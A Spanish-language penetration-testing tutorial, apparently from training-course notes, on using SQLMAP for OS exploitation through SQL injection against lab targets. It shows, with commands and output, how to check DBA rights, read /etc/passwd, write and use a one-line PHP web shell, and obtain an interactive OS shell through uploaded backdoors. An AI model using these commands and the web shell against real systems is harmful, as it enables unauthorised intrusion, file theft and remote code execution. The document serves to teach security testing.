# OS Exploitation

SQLMAP tiene la capacidad de utilizar una inyección SQL para leer y escribir archivos desde el sistema local fuera del DBMS. SQLMAP también puede intentar darnos una ejecución de comando directo en el host remoto si tuviéramos los privilegios adecuados.

---

# **Archivo Leer/Escribir**

La primera parte de la explotación del sistema operativo a través de una vulnerabilidad de inyección SQL es leer y escribir datos en el servidor de alojamiento. La lectura de datos es mucho más común que escribir datos, que es estrictamente privilegiado en los DBMS modernos, ya que puede conducir a la explotación del sistema, como veremos. Por ejemplo, en MySQL, para leer archivos locales, el usuario de DB debe tener el privilegio de`LOAD DATA`y`INSERT`, para poder cargar el contenido de un archivo en una tabla y luego leer esa tabla.

Un ejemplo de tal comando es:

- `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;`

Si bien no necesariamente necesitamos tener privilegios de administrador de bases de datos (DBA) para leer datos, esto se está volviendo más común en los DBMS modernos. Lo mismo se aplica a otras bases de datos comunes. Aún así, si tenemos privilegios de DBA, entonces es mucho más probable que tengamos privilegios de lectura de archivos.

---

# **Verificar los privilegios de DBA**

Para verificar si tenemos privilegios de DBA con SQLMAP, podemos usar el`--is-dba`opción:

OS Exploitation

```
xnoxos@htb[/htb]$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.11#stable}|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 17:31:55 /2020-11-19/

[17:31:55] [INFO] resuming back-end DBMS 'mysql'
[17:31:55] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
current user is DBA: False

[*] ending @ 17:31:56 /2020-11-19

```

Como podemos ver, si lo probamos en uno de los ejercicios anteriores, obtenemos`current user is DBA: False`, lo que significa que no tenemos acceso DBA. Si intentamos leer un archivo usando SQLMAP, obtendríamos algo como:

Explotación del sistema operativo

```
[17:31:43] [INFO] fetching file: '/etc/passwd'
[17:31:43] [ERROR] no data retrieved

```

Para probar la explotación del sistema operativo, intentemos un ejercicio en el que tengamos privilegios de DBA, como se ve en las preguntas al final de esta sección:

Explotación del sistema operativo

```
xnoxos@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --is-dba        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.11#stable}|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 17:37:47 /2020-11-19/

[17:37:47] [INFO] resuming back-end DBMS 'mysql'
[17:37:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
current user is DBA: True

[*] ending @ 17:37:48 /2020-11-19/

```

Vemos que esta vez tenemos`current user is DBA: True`, lo que significa que podemos tener el privilegio de leer archivos locales.

---

# **Leyendo archivos locales**

En lugar de inyectar manualmente la línea anterior a través de SQLI, SQLMAP hace que sea relativamente fácil leer archivos locales con el`--file-read`opción:

Explotación del sistema operativo

```
xnoxos@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.11#stable}|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 17:40:00 /2020-11-19/

[17:40:00] [INFO] resuming back-end DBMS 'mysql'
[17:40:00] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
[17:40:01] [INFO] fetching file: '/etc/passwd'
[17:40:01] [WARNING] time-based comparison requires larger statistical model, please wait............................. (done)
[17:40:07] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[17:40:07] [WARNING] unable to retrieve the content of the file '/etc/passwd', going to fall-back to simpler UNION technique
[17:40:07] [INFO] fetching file: '/etc/passwd'
do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] y

[17:40:14] [INFO] the local file '~/.sqlmap/output/www.example.com/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (982 B)
files saved to [1]:
[*] ~/.sqlmap/output/www.example.com/files/_etc_passwd (same file)

[*] ending @ 17:40:14 /2020-11-19/

```

Como podemos ver, dijo SQLMAP`files saved`a un archivo local. Podemos`cat`el archivo local para ver su contenido:

Explotación del sistema operativo

```
xnoxos@htb[/htb]$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwdroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...

```

Hemos recuperado con éxito el archivo remoto.

---

# **Escribir archivos locales**

Cuando se trata de escribir archivos en el servidor de alojamiento, se vuelve mucho más restringido en los DMBSE modernos, ya que podemos utilizar esto para escribir un shell web en el servidor remoto y, por lo tanto, obtener la ejecución del código y tomar el servidor.

Esta es la razón por la cual los DBMS modernos desactivan el archivo de archivo de forma predeterminada y necesitan ciertos privilegios para que DBA pueda escribir archivos. Por ejemplo, en mysql, el`--secure-file-priv`La configuración debe desactivarse manualmente para permitir la escritura de datos en archivos locales utilizando el`INTO OUTFILE`Consulta SQL, además de cualquier acceso local necesario en el servidor host, como el privilegio de escribir en el directorio que necesitamos.

Aún así, muchas aplicaciones web requieren la capacidad de los DBMS de escribir datos en archivos, por lo que vale la pena probar si podemos escribir archivos en el servidor remoto. Para hacer eso con SQLMAP, podemos usar el`--file-write`y`--file-dest`opciones. Primero, preparemos un shell web básico de PHP y escríbelo en un`shell.php`archivo:

Explotación del sistema operativo

```
xnoxos@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Ahora, intentemos escribir este archivo en el servidor remoto, en el`/var/www/html/`Directorio, el Servidor WebRoot predeterminado para Apache. Si no conocíamos el Servidor Webroot, veremos cómo SQLMAP puede encontrarlo automáticamente.

Explotación del sistema operativo

```
xnoxos@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.11#stable}|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 17:54:18 /2020-11-19/

[17:54:19] [INFO] resuming back-end DBMS 'mysql'
[17:54:19] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
do you want confirmation that the local file 'shell.php' has been successfully written on the back-end DBMS file system ('/var/www/html/shell.php')? [Y/n] y

[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)

[*] ending @ 17:54:28 /2020-11-19/

```

Vemos que SQLMAP confirmó que el archivo fue escrito de hecho:

Explotación del sistema operativo

```
[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)

```

Ahora, podemos intentar acceder al shell PHP remoto y ejecutar un comando de muestra:

Explotación del sistema operativo

```
xnoxos@htb[/htb]$ curl http://www.example.com/shell.php?cmd=ls+-latotal 148
drwxrwxrwt 1 www-data www-data   4096 Nov 19 17:54 .
drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
...SNIP...

```

Vemos que nuestro shell PHP fue escrito en el servidor remoto, y que tenemos ejecución de comandos a través del servidor host.

---

# **Ejecución del comando del sistema operativo**

Ahora que confirmamos que podríamos escribir un shell PHP para obtener la ejecución de comandos, podemos probar la capacidad de SQLMAP de darnos un shell de sistema operativo fácil sin escribir manualmente un shell remoto. SQLMAP utiliza varias técnicas para obtener un shell remoto a través de vulnerabilidades de inyección SQL, como escribir un shell remoto, como lo hicimos, escribiendo funciones SQL que ejecutan comandos y recuperan la salida o incluso utilizan algunas consultas SQL que ejecutan directamente el comando del sistema operativo, como`xp_cmdshell`En Microsoft SQL Server. Para obtener un shell del sistema operativo con SQLMAP, podemos usar el`--os-shell`Opción, como sigue:

Explotación del sistema operativo

```
xnoxos@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.11#stable}|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 18:02:15 /2020-11-19/

[18:02:16] [INFO] resuming back-end DBMS 'mysql'
[18:02:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
[18:02:37] [INFO] the local file '/tmp/sqlmapmswx18kp12261/lib_mysqludf_sys8kj7u1jp.so' and the remote file './libslpjs.so' have the same size (8040 B)
[18:02:37] [INFO] creating UDF 'sys_exec' from the binary UDF file
[18:02:38] [INFO] creating UDF 'sys_eval' from the binary UDF file
[18:02:39] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
[18:02:39] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> ls -la
do you want to retrieve the command standard output? [Y/n/a] a

[18:02:45] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
No output

```

Vemos que SQLMAP predeterminado a`UNION`técnica para obtener un shell del sistema operativo, pero finalmente no pudo darnos ninguna salida`No output`. Entonces, como ya sabemos, tenemos múltiples tipos de vulnerabilidades de inyección SQL, intentemos especificar otra técnica que tenga una mejor oportunidad de darnos una salida directa, como la`Error-based SQL Injection`, que podemos especificar con`--technique=E`:

Explotación del sistema operativo

```
xnoxos@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.11#stable}|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 18:05:59 /2020-11-19/

[18:05:59] [INFO] resuming back-end DBMS 'mysql'
[18:05:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4

do you want sqlmap to further try to provoke the full path disclosure? [Y/n] y

[18:06:07] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 1

[18:06:09] [WARNING] unable to automatically parse any web server path
[18:06:09] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[18:06:09] [WARNING] potential permission problems detected ('Permission denied')
[18:06:10] [WARNING] unable to upload the file stager on '/var/www/'
[18:06:10] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[18:06:11] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpumgzr.php
[18:06:11] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpbznbe.php
[18:06:11] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> ls -la

do you want to retrieve the command standard output? [Y/n/a] a

command standard output:
---
total 156
drwxrwxrwt 1 www-data www-data   4096 Nov 19 18:06 .
drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
...SNIP...

```

Como podemos ver, esta vez SQLMAP nos dejó con éxito en un shell remoto interactivo fácil, dándonos una ejecución fácil de código remoto a través de este SQLI.

Nota: SQLMAP primero nos pidió el tipo de lenguaje utilizado en este servidor remoto, que sabemos que es PHP. Luego nos pidió el directorio raíz web del servidor, y le pedimos a SQLMAP que lo encontrara automáticamente utilizando 'ubicaciones comunes'. Ambas opciones son las opciones predeterminadas, y se habrían elegido automáticamente si agregamos la opción '-Batch' a SQLMAP.

Con esto, hemos cubierto toda la funcionalidad principal de SQLMAP.